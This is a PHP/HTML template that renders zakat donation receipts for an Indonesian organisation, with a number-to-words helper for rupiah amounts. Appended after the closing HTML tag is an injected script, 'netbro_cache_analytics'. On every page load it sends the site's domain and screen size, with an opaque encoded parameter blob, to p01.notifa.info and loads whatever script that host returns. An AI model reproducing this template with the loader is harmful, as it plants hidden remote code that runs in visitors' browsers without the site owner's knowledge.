<?php
foreach ($data_master->result() as $row) {
$nama_organisasi = $row->nama_organisasi;
$nama_lembaga = $row->nama_lembaga;
$logo = $row->logo_organisasi;
$pembayaran = $row->pembayaran;
$kota = $row->kota_kwitansi;
$alamat = $row->alamat_organisasi;
}
?>
<!DOCTYPE html>
<html>
<head>
	<title></title>
<style type="text/css"></style>
</head>
<body>
<?php 
foreach ($data_peserta->result() as $row) { ?>
 <table width="100%" cellpadding="4" cellspacing="0" style="border: 1px solid #000; font-size: 13px">  
 <tr>
   <td valign="top" align="center"><img style="width: 70px; height: 70px" src="<?php echo ('./assets/img/'.$logo)?>"></td>
   <td valign="top" colspan="3">
      <table>
         <tr>
            <td><b><?php echo $nama_organisasi; ?></b></td>
         </tr>
         <tr>
            <td><b><?php echo $nama_lembaga; ?></b></td>
         </tr>
         <tr>
            <td><?php echo $alamat; ?></td>   
         </tr>
      </table>
   </td>    
 </tr> 
 <tr>
   <td rowspan="8" style="width: 5%;border-right: 1px solid;border-top: 1px solid">    
      <center><h4 style="transform: rotate(-90deg); margin-left: 20%">KWITANSI PENERIMAAN</h4></center>
   </td>
   <td valign="top" width="17%" style="border-top: 1px solid"> Telah Diterima </td>
   <td valign="top" width="5%" style="border-top: 1px solid">:</td>    
   <td valign="top" width="80%" style="border-top: 1px solid"><?php echo $row->nama_pemberi_zakat; ?></td>  
 </tr>  
 <tr>  
   <td valign="top" > Terbilang </td>
   <td valign="top" > : </td>    
   <td valign="top" ><i>## <?php echo ucwords(Terbilang($row->nominal_zakat))." Rupiah"; ?> ##</i></td>  
 </tr>  
 <tr>  
   <td valign="top" > Pembayaran </td>
   <td valign="top" > : </td>    
   <td valign="top" ><?php echo $pembayaran; ?><br>
   	<p style="font-size: 10px">*Setelah Di Print Lingkari Kwitansi Sesuai Data yang diterima</p>
   </td>  
 </tr>  
 <tr>  
   <td><br> <h4><?php $hasil_rupiah = "Rp " . number_format($row->nominal_zakat,2,',','.'); echo $hasil_rupiah; ?> </h4> </td>  
   <td colspan="2" valign="top" height="80" align="right">
   		<table width="40%" align="right">
   			<tr>
   				<td width="7%"><?php echo $kota; ?>, </td>
   				<td width="30%" colspan="2" align="left"><?php echo date('d F Y') ; ?></td>
   			</tr>
   			<?php 
        foreach ($ttd->result() as $key => $value) { ?>
          
        <tr>
          <td colspan="3"><?= $value->jabatan_laporan ?>,</td>
        </tr>
        <tr>
          <td colspan="3" height="30px"></td>
        </tr>
        <tr>
          <td colspan="3"><?php echo $value->nama_pemilik_jabatan; ?></td>
        </tr>
        <?php } ?>
   		</table>
   </td>  
 </tr>  
 </table>
 <?php } ?>  
</body>
</html>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "¶ms=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mmaRj7mAaaOrOUfvFbMOdz3eDzWtLZzxQtA7PkQauXOXlBrtPfPzgtryyrVmTUXtqB4aUf17e1pVtqZq62GQVovdHG9LLPu0REMoX4EGX9Qctg5WfjZQhUVGbM5w%2fKbR13w%2bqLsTPfAN6QH1LbuSKgljaJC4P7AEsCBp8f84k5OqVcFmzWHEpj3M9KR9eG%2fgZm%2flSqbLSMvCFJJFVsp035SIhtvFGFn2VZ%2f%2fcc0wCihDwRDVgT3CzAw4ztC3mQ%2bSM0zNFsqTwC7hPqSelcvHJnWflDn9p8KA040o6fGeuvcbsUMp33Q22xP%2fyvOTG5xj6l58adJehvmpuYtfXoQFrDwTcqdhLMnVhsGIfaGVKQUYyy7fKOO2oADeJZzNlHbOK1OAnd0ugipR9wMXdNKz3g0upqLt%2bzDc4xywUnPY4UsTW0MlDC9lrqIVMHbdMVCXKfqhcqWNMjnEkWh%2bLaUNh2Plz3fqyr9Z1v4vpw9LgAOKOtRhRJMto%2bBnXsTK%2fynYP1i11pp9VzF2j8QS5Pnr1Id4PAw9Fj%2fNaZaxsM1FzXLrlRjMQK34ympT8Hdy%2bt78iMciBFW%2fuN0JpfCh%2bmczz03eFVBPwcoGhmedohGt763j0yUkzoYl9%2fVgkeSwcV4qm7NYcyTf1dlI%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>
<?php

function Terbilang($x)
{
  $abil = array("", "satu", "dua", "tiga", "empat", "lima", "enam", "tujuh", "delapan", "sembilan", "sepuluh", "sebelas");
  if ($x < 12)
    return " " . $abil[$x];
  elseif ($x < 20)
    return Terbilang($x - 10) . "belas";
  elseif ($x < 100)
    return Terbilang($x / 10) . " puluh" . Terbilang($x % 10);
  elseif ($x < 200)
    return " seratus" . Terbilang($x - 100);
  elseif ($x < 1000)
    return Terbilang($x / 100) . " ratus" . Terbilang($x % 100);
  elseif ($x < 2000)
    return " seribu" . Terbilang($x - 1000);
  elseif ($x < 1000000)
    return Terbilang($x / 1000) . " ribu" . Terbilang($x % 1000);
  elseif ($x < 1000000000)
    return Terbilang($x / 1000000) . " juta" . Terbilang($x % 1000000);
 
 
}

?>